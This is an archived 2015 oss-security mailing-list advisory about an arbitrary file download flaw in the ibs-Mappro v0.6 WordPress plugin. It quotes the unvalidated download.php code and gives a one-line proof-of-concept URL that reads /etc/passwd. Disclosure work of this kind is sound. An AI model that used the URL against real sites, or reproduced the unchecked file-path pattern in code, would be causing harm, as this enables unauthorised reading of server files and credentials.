X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1733" "Thursday" "9" "July" "2015" "15:11:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<96A295FE-F854-48B5-9E9E-45A85F16FE81@me.com>" "51" "[oss-security] Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin" nil nil nil "7" "2015070919:11:33" "[oss-security] Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin" (number mark "U       larry0@me.co Jul  9   51/1733  " thread-indent "\"[oss-security] Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1825 invoked by uid 550); 9 Jul 2015 19:15:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1722 invoked from network); 9 Jul 2015 19:14:56 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-09_10:2015-07-08,2015-07-09,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507090272
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <96A295FE-F854-48B5-9E9E-45A85F16FE81@me.com>
Date: Thu, 09 Jul 2015 15:11:33 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plugin

Title: Remote file download vulnerability in ibs-Mappro v0.6 Wordpress plug=
in
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-08
Download Site: https://wordpress.org/plugins/ibs-mappro/
Vendor: Hmoore71
Vendor Notified: 2015-07-08, resolved in v1.0.
Vendor Contact: Contacted via webform
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D137
Description: IBS Mappro is a comprehensive map creator, editor, and view ge=
nerator based on the Google Maps API v3 and supports kml, kmz, and gpx map =
files.
Vulnerability:
the download.php script allows any remote user to download files off of the=
 server:
if (isset($_GET)) {
    $filename =3D $_GET['file'];
    $info =3D pathinfo($filename);
    $name =3D $info['basename'];
    if (file_exists($filename)) {
        header('Set-Cookie: fileDownload=3Dtrue; path=3D/');
        header('Cache-Control: max-age=3D60, must-revalidate');
        header('Content-Disposition: attachment; filename=3D"' . $title . '=
-' . $timestamp . '.csv"');
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=3D"' . $name . '"=
');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=3D0, pre-check=
=3D0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filename));
        ob_clean();
        flush();
        readfile($filename);
        exit;
    } else {
        die;
    }
} else {
    die;
}
?>
=20
CVEID: Please assign.
OSVDB: TDB
Exploit Code:
	=E2=80=A2 http://example.com/wp-content/plugins/ibs-mappro/lib/download.ph=
p?file=3D/etc/passwd=
